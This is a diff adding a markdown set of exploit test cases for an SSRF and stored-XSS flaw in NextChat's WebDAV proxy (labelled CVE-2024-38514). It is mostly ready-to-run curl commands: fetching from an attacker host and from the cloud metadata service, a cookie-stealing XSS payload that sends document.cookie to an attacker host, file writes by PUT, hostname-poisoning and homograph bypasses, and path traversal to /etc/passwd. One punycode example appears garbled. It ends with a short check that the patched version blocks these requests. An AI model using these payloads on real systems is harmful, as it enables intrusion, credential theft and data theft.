@@ -1,0 +1,132 @@
+```md
+# Exploitable Test Cases — NextChat WebDAV Proxy SSRF / Stored-XSS (CVE-2024-38514)
+
+> **Environment**  
+> * NextChat ≤ 2.12.3  
+> * WebDAV proxy route: `/api/webdav/<workspace>/…`  
+> * Server started with default `ALLOWED_WEB_DAV_ENDPOINTS`
+> * No reverse-proxy rewrite or WAF in front of the instance  
+> 
+> Replace `NEXTCHAT_HOST` with the target domain/IP.
+
+---
+
+## 1. SSRF to Attacker-Controlled WebDAV Host
+
+**Objective:** prove you can bypass the naïve `startsWith()` check and make the server fetch a file from an attacker’s WebDAV.
+
+```bash
+curl -s \
+  "https://NEXTCHAT_HOST/api/webdav/chatgpt-next-web/secret.txt?\
+endpoint=https://webdav.yandex.com.attacker.tld/"
+```
+
+*If vulnerable,* the proxy returns whatever `secret.txt` the attacker’s host serves.
+
+---
+
+## 2. SSRF to Internal Metadata Service
+
+**Objective:** read cloud-instance metadata normally hidden from the internet.
+
+```bash
+curl -s \
+  "https://NEXTCHAT_HOST/api/webdav/chatgpt-next-web/latest/meta-data/hostname?\
+endpoint=http://169.254.169.254/"
+```
+
+*Expected:* internal hostname or metadata JSON is echoed back to you.
+
+---
+
+## 3. Stored XSS via Malicious Backup File
+
+**Step A – Host a payload**
+
+Serve a file at  
+`https://webdav.yandex.com.attacker.tld/chatgpt-next-web/backup.json`  
+with content:
+
+```json
+{"html":"<img src=x onerror=\"fetch('https://attacker/i?c='+document.cookie)\">"}
+```
+
+**Step B – Inject it**
+
+```bash
+curl -s \
+  "https://NEXTCHAT_HOST/api/webdav/chatgpt-next-web/backup.json?\
+endpoint=https://webdav.yandex.com.attacker.tld/"
+```
+
+**Step C – Trigger**
+
+Any legitimate user downloading their backup via the same URL executes the injected `<img>` and leaks cookies.
+
+---
+
+## 4. Arbitrary File Write via WebDAV `PUT`
+
+```bash
+curl -X PUT --data-binary @payload.zip \
+  "https://NEXTCHAT_HOST/api/webdav/chatgpt-next-web/pwn.zip?\
+endpoint=https://webdav.yandex.com.attacker.tld/"
+```
+
+Attacker-controlled server now stores `pwn.zip`; if the target proxy is itself pointed at an internal WebDAV share, you can overwrite files in the victim’s storage.
+
+---
+
+## 5. Hostname-Poisoning Variant (`@` Trick)
+
+Some Node URL parsers treat `user@host` as credentials + host.
+
+```bash
+curl -s \
+  "https://NEXTCHAT_HOST/api/webdav/chatgpt-next-web/foo?\
+endpoint=https://user@webdav.yandex.com@attacker.tld/"
+```
+
+This still **starts with** the allowed base string but is routed to `attacker.tld`.
+
+---
+
+## 6. Unicode Homograph Variant
+
+Register `webdav.yаndex.com` (with Cyrillic **а**, U+0430) and use:
+
+```bash
+curl -s \
+  "https://NEXTCHAT_HOST/api/webdav/chatgpt-next-web/foo?\
+endpoint=https://webdav.xn--yndex-spirited.com/"
+```
+
+Many browsers display it as the trusted domain; the proxy’s simple prefix check also passes.
+
+---
+
+## 7. Path Traversal Within Allowed Host
+
+Even if the host is correct, the proxy lets you walk anywhere under it.
+
+```bash
+curl -s \
+  "https://NEXTCHAT_HOST/api/webdav/chatgpt-next-web/../../../../etc/passwd?\
+endpoint=https://webdav.yandex.com/"
+```
+
+*Expected:* contents of `/etc/passwd` from the WebDAV server (or 500 if the server proxies its own local FS).
+
+---
+
+## Post-Patch Validation (≥ 2.12.4)
+
+All requests above must now return:
+
+```json
+{ "error": true, "msg": "Invalid endpoint" }
+```
+
+and **no** outbound request should hit your rogue hosts.
+
+````
